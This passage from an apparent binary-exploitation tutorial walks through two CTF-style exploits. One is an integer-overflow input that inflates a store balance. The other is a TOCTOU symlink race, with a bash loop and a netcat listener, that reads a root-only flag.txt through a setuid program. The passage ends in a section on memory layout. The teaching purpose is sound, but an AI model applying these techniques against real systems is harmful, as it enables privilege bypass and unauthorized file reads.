</span></span></code></pre></div><p>If we put some negative number in <code>total_cost</code> it will be like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>account_balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">1100</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">10</span> <span style="color:#75715e">// Becomes positive 1110
</span></span></span></code></pre></div><p>Now that if we look at above we code we can see that <code>total_cost</code> is calculated from:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>total_cost <span style="color:#f92672">=</span> <span style="color:#ae81ff">900</span> <span style="color:#f92672">*</span> number_flags;
</span></span></code></pre></div><p>Here‚Äôs where <strong>integer overflow</strong> comes in. Since <code>total_cost</code> is an <code>int</code>, it has a maximum value (<code>INT_MAX</code>), which is <code>2147483647</code> for 32-bit signed integers. If we input a <strong>very large value</strong> for <code>number_flags</code>, say around <code>2386093</code>, this multiplication will <strong>overflow</strong> and cause <code>total_cost</code> to become a <strong>negative number</strong> due to wraparound.</p>
<p>Since <code>total_cost</code> is already being multiplied by our number of flags with 900 we can put <code>number_flags</code> as <code>2388092</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>total_cost = 900 * 2388092 = 2149282800
</span></span></code></pre></div><p>That value is <strong>greater than <code>INT_MAX</code></strong> (which is <code>2,147,483,647</code>), so it <strong>overflows</strong>. On overflow, <code>total_cost</code> wraps around into a negative number <code>-2149282800</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>account_balance = 1100 - (-2149282800) 
</span></span></code></pre></div><p>That negative <code>total_cost</code> will then be subtracted from <code>account_balance</code>, causing our balance to jump <strong>way up</strong>. Once that happens, we can pass the check:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(account_balance <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100000</span>)
</span></span></code></pre></div><p>and successfully buy the 1337 flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./store
</span></span><span style="display:flex;"><span>Welcome to the flag exchange
</span></span><span style="display:flex;"><span>We sell flags
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1. Check Account Balance
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2. Buy Flags
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>3. Exit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Enter a menu selection
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Currently <span style="color:#66d9ef">for</span> sale
</span></span><span style="display:flex;"><span>1. Defintely not the flag Flag
</span></span><span style="display:flex;"><span>2. <span style="color:#ae81ff">1337</span> Flag
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>These knockoff Flags cost <span style="color:#ae81ff">900</span> each, enter desired quantity
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2388092</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The final cost is: -2145684496
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Your current balance after transaction: <span style="color:#ae81ff">2145685596</span>
</span></span></code></pre></div><h2 id="0x3---race-condition">0x3 - Race Condition</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//https://exploit.education/nebula/level-10/
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>file;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>host;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s file host</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">sends file to host if you have access to it</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  file <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>  host <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">access</span>(argv[<span style="color:#ae81ff">1</span>], R_OK) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> fd;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> ffd;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> rc;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> sockaddr_in sin;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">4096</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Connecting to %s:18211 .. &#34;</span>, host); <span style="color:#a6e22e">fflush</span>(stdout);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>sin, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr_in));
</span></span><span style="display:flex;"><span>      sin.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>      sin.sin_addr.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(host);
</span></span><span style="display:flex;"><span>      sin.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(<span style="color:#ae81ff">18211</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">connect</span>(fd, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sin, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr_in)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Unable to connect to host %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, host);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define HITHERE &#34;.oO Oo.\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">write</span>(fd, HITHERE, <span style="color:#a6e22e">strlen</span>(HITHERE)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Unable to write banner to host %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, host);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#undef HITHERE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Connected!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Sending file .. &#34;</span>); <span style="color:#a6e22e">fflush</span>(stdout);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      ffd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(file, O_RDONLY);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(ffd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Damn. Unable to open file</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      rc <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(ffd, buffer, <span style="color:#66d9ef">sizeof</span>(buffer));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(rc <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Unable to read from file: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strerror</span>(errno));
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">write</span>(fd, buffer, rc);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;wrote file!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You don&#39;t have access to %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, file);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>gcc race.c -o race</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la    
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">2</span> at0m at0m  <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 17:34 .
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">21</span> at0m at0m  <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 17:03 ..
</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">19</span> Jun <span style="color:#ae81ff">26</span> 17:03 flag.txt
</span></span><span style="display:flex;"><span>-rwsr-xr-x  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">17416</span> Jun <span style="color:#ae81ff">26</span> 17:03 race
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">1752</span> Jun <span style="color:#ae81ff">26</span> 17:03 race.c
</span></span></code></pre></div><p>We can see that only root can read <code>flag.txt</code>. We need to somehow exploit <code>race</code> file to read <code>flag.txt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./race      
</span></span><span style="display:flex;"><span>./race file host
</span></span><span style="display:flex;"><span>	sends file to host <span style="color:#66d9ef">if</span> you have access to it
</span></span></code></pre></div><p>We can send file but only if we have access to it. So we can&rsquo;t directly use it to read flag thats why I created a <code>readable.txt</code> file and we are sending it to ourself.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./race readable.txt 127.0.0.1
</span></span><span style="display:flex;"><span>Connecting to 127.0.0.1:18211 .. Unable to connect to host 127.0.0.1
</span></span></code></pre></div><p>We get error since we haven&rsquo;t started our listener on port <code>18211</code> in which its trying to send.</p>
<p><img src="/img/list.png" alt="list.png"></p>
<p>We can read  the file content from our listener port now. So we somehow need to exploit program to read ourself that flag.txt file which is currently readable by root. First reading source code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//https://exploit.education/nebula/level-10/
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>file;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>host;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s file host</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">sends file to host if you have access to it</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  file <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>  host <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">access</span>(argv[<span style="color:#ae81ff">1</span>], R_OK) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> fd;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> ffd;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> rc;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> sockaddr_in sin;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">4096</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Connecting to %s:18211 .. &#34;</span>, host); <span style="color:#a6e22e">fflush</span>(stdout);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>sin, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr_in));
</span></span><span style="display:flex;"><span>      sin.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>      sin.sin_addr.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(host);
</span></span><span style="display:flex;"><span>      sin.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(<span style="color:#ae81ff">18211</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">connect</span>(fd, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sin, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr_in)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Unable to connect to host %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, host);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define HITHERE &#34;.oO Oo.\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">write</span>(fd, HITHERE, <span style="color:#a6e22e">strlen</span>(HITHERE)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Unable to write banner to host %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, host);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#undef HITHERE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Connected!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Sending file .. &#34;</span>); <span style="color:#a6e22e">fflush</span>(stdout);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      ffd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(file, O_RDONLY);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(ffd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Damn. Unable to open file</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      rc <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(ffd, buffer, <span style="color:#66d9ef">sizeof</span>(buffer));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(rc <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Unable to read from file: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strerror</span>(errno));
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">write</span>(fd, buffer, rc);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;wrote file!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You don&#39;t have access to %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, file);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This program contains a critical¬†<strong>Time-of-Check to Time-of-Use (TOCTOU) race condition vulnerability</strong>, which allows an attacker to bypass file permission checks and read restricted files like¬†<code>flag.txt</code>¬†that are only accessible by¬†<code>root</code>. The issue arises because the program first verifies file access permissions using¬†<code>access()</code>¬†and later opens the file with¬†<code>open()</code>, creating a small but exploitable time gap between these two operations. During this brief window, an attacker can manipulate the filesystem to trick the program into reading a file they shouldn‚Äôt have access to.</p>
<p>First we will create a harmless file we control <code>link.txt</code> and set up a symbolic link to <code>fake_flag.txt</code> pointing to it. When program runs it checks permission of <code>race</code> and sees that it points to <code>link.txt</code> which is accessible and proceeds. But right after the <code>access()</code> check but before the <code>open()</code> call, we can quickly changes the symlink to point to <code>flag.txt</code>. If timed correctly, program will open and read the restricted flag file, sending its contents to a remote listener.</p>
<p>To automate this race, the attacker runs a loop that repeatedly switches the symlink between the fake file and the real flag, increasing the chances of winning the race condition. Meanwhile, a¬†<code>netcat</code>¬†listener waits to receive the stolen flag data. This attack succeeds because Unix file operations are not atomic meaning there‚Äôs no guarantee that the file being checked is the same one being opened.
Thats why its called <strong>race condition</strong>. We are racing against the process.</p>
<p><strong>Modern Linux systems have protections against classic TOCTOU (Time-of-Check-to-Time-of-Use) attacks</strong>, particularly those involving symbolic link races but this doesn&rsquo;t mean race condition doesn&rsquo;t work nowdays if you look at latest CVEs, there are many with race condition its just that this particular technique doesn&rsquo;t work.</p>
<p>We can use simple bash script to do it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ  <span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span> ln -sf flag.txt link.txt; ln -sf fake_flag.txt link.txt; <span style="color:#66d9ef">done</span> &amp;  
</span></span></code></pre></div><p><code>&amp;</code> is used to run process in background. If we now check the file we can see its symlink is constantly being changed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> at0m at0m     <span style="color:#ae81ff">13</span> Jun <span style="color:#ae81ff">26</span> 20:44 link.txt -&gt; fake_flag.txt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> at0m at0m     <span style="color:#ae81ff">13</span> Jun <span style="color:#ae81ff">26</span> 20:44 link.txt -&gt; flag.txt
</span></span></code></pre></div><p>After doing this  do same step like running the race file with <code>link.txt</code>  using command <code>./race link.txt 127.0.0.1</code> and receiving from another tab using netcat. Use <code>nc -knvlp 18211</code>, we use <code>k</code> flag as we want netcat to not close the connection after getting one request as we have to perform it multiple times for results to appear. If you don&rsquo;t get flag.txt contents the first time you will have to run this command <code>./race link.txt 127.0.0.1</code> again and after 3-4 tries it will work.</p>
<p><img src="/img/race-condition.jpg" alt="race-condition.jpg"></p>
<p>To prevent such exploits, developers should avoid using¬†<code>access()</code>¬†for security checks. Instead, they should directly open the file and handle permission errors afterward, or use atomic filesystem operations where possible.</p>
<h2 id="0x4---stack-overflow">0x4 - Stack Overflow</h2>
<p>Many people confuse stack and buffer overflow as same things but stack overflow is part of Buffer overflow. <strong>Buffers</strong> means a temporary memory where we can store any data. Before understanding about stack overflow we need to understand what <strong>stack</strong> is.</p>
<p>When we run a program it turns into process. When process code runs in RAM. Every process has its certain memory region called <strong>memory map</strong>. It mainly has 4 parts:</p>
<h3 id="application">Application</h3>
<p>The¬†<strong>application section</strong>¬†contains the actual executable code and static data, including the machine instructions in the¬†<code>.text</code>¬†segment, initialized global variables in¬†<code>.data</code>, read-only constants in¬†<code>.rodata</code>, and zero-initialized variables in¬†<code>.bss</code>. This area is typically read-only to prevent accidental code modification.</p>
<h3 id="heap">Heap</h3>
<p>Next comes the¬†<strong>heap</strong>, a dynamically managed memory region that grows upward toward higher addresses. Programs use the heap for runtime memory allocation through functions like¬†<code>malloc()</code>¬†or¬†<code>new</code>, making it susceptible to heap-based buffer overflows if proper bounds checking isn&rsquo;t enforced. Unlike the stack, heap memory persists until explicitly freed, leading to potential memory leaks if not managed carefully. <strong>Use the heap for large or dynamic data</strong>¬†that must outlive a function or has an unknown size. Example:¬†<code>int* arr = malloc(100 * sizeof(int));</code>¬†(manual cleanup required with¬†<code>free()</code>). You can ask operating system to increase your heap size.</p>
<h3 id="libraries">Libraries</h3>
